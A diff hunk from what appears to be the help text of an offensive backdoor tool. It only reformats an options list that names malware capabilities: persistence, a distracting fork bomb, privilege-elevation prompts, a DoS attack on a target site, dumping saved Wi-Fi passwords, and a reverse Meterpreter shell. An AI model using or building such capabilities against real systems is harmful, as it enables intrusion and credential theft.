@@ -44,17 +44,17 @@ Options :
               /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                    
 
-~PERSSISTENCE                     Installs a persistence module
+- ~PERSSISTENCE                     Installs a persistence module
 
-~DISTRACT                         Executes a fork bomb bat file for distraction   
+- ~DISTRACT                         Executes a fork bomb bat file for distraction   
 
-~PLEASE  "Command"                Asks users comfirmation for higher privilidge operations
+- ~PLEASE  "Command"                Asks users comfirmation for higher privilidge operations
 
-~DOS -A "www.targetsite.com"      Starts a denial of service atack
+- ~DOS -A "www.targetsite.com"      Starts a denial of service atack
 
-~WIFI-LIST 						            Dumps all wifi history data with passwords
+- ~WIFI-LIST 						            Dumps all wifi history data with passwords
 
-~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit
+- ~METERPRETER -A "127.0.0.1:8888"  Creates a reverse https meterpreter connection to metasploit
 
 # NOTE
 
